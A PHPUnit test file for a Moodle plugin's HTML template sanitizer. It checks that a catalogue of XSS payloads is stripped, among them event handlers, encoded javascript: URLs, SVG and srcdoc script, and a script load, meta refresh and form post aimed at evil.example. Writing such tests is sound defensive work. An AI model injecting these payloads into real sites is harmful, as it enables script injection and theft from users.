<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

namespace local_academy;

use local_academy\local\template_sanitizer;

/**
 * Tests the cleaner for Database activity templates (HTML fragments with [[field]] / ##tag## placeholders).
 *
 * @package    local_academy
 * @copyright  2026 NIT
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 * @covers     \local_academy\local\template_sanitizer
 */
final class template_sanitizer_test extends \basic_testcase {

    /**
     * Script in every shape the browser would run, and what must be left of it.
     *
     * @return array
     */
    public static function dangerous_provider(): array {
        return [
            'script element' => ['<p>a</p><script>alert(1)</script><p>b</p>', '<p>a</p><p>b</p>'],
            'unclosed script' => ['<p>a</p><SCRIPT src=//evil.example/x.js>', '<p>a</p>'],
            'event handler' => ['<img src="x" onerror="alert(1)">', '<img src="x">'],
            'handler glued to an attribute' => ['<img src="x"onerror="alert(1)">', '<img src="x">'],
            'javascript url' => ['<a href="javascript:alert(1)">x</a>', '<a>x</a>'],
            'encoded javascript url' => ['<a href="jav&#x09;ascript&#58;alert(1)">x</a>', '<a>x</a>'],
            'data url' => ['<a href=" data:text/html,<script>alert(1)</script>">x</a>', '<a>x</a>'],
            'iframe srcdoc' => ['<iframe srcdoc="<script>alert(1)</script>"></iframe>ok', 'ok'],
            'svg' => ['<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">x</a></svg>ok', 'ok'],
            'split tag' => ['<scr<script>x</script>ipt>alert(1)</script>', 'xipt>alert(1)'],
            'style with script url' => ['<div style="background:url(javascript:alert(1))">x</div>', '<div>x</div>'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.example">x', 'x'],
            'form posting away' => ['<form action="https://evil.example"><input name="p"></form>', '<input name="p">'],
            'comment hiding a tag' => ['<!--><img src=x onerror=alert(1)>-->ok', 'ok'],
            'field in an attribute' => ['<div title="[[notes]]">[[notes]]</div>', '<div title="">[[notes]]</div>'],
            'quote breaking out' => ['<div title=\'a" onclick="alert(1)\'>x</div>', '<div title="a&quot; onclick=&quot;alert(1)">x</div>'],
        ];
    }

    /**
     * @dataProvider dangerous_provider
     * @param string $dirty
     * @param string $expected
     */
    public function test_script_is_removed(string $dirty, string $expected): void {
        $this->assertSame($expected, template_sanitizer::clean($dirty));
    }

    public function test_layout_and_placeholders_are_kept(): void {
        $html = '<div id="entry-##id##" class="card" role="tab" aria-expanded="true" style="color: red;">'
            . '<a data-bs-toggle="collapse" href="#collapseentry-##id##">[[Title]]</a> '
            . '<a href="##moreurl##" target="_blank">more</a><img src="https://example.com/a.png" alt="photo">'
            . '<br/>##actionsmenu## &amp; &nbsp; 5 &lt; 6</div>';
        $this->assertSame($html, template_sanitizer::clean($html));
    }

    public function test_fragments_keep_their_open_and_close_tags(): void {
        $this->assertSame('<table class="t"><tbody>', template_sanitizer::clean('<table class="t"><tbody>'));
        $this->assertSame('<tr><td>[[a]]</td></tr>', template_sanitizer::clean('<tr><td>[[a]]</td></tr>'));
        $this->assertSame('</tbody></table>', template_sanitizer::clean('</tbody></table>'));
    }

    public function test_text_without_tags_is_unchanged(): void {
        $this->assertSame('', template_sanitizer::clean(''));
        $this->assertSame('Price < 5 & [[x]]', template_sanitizer::clean('Price < 5 & [[x]]'));
    }
}
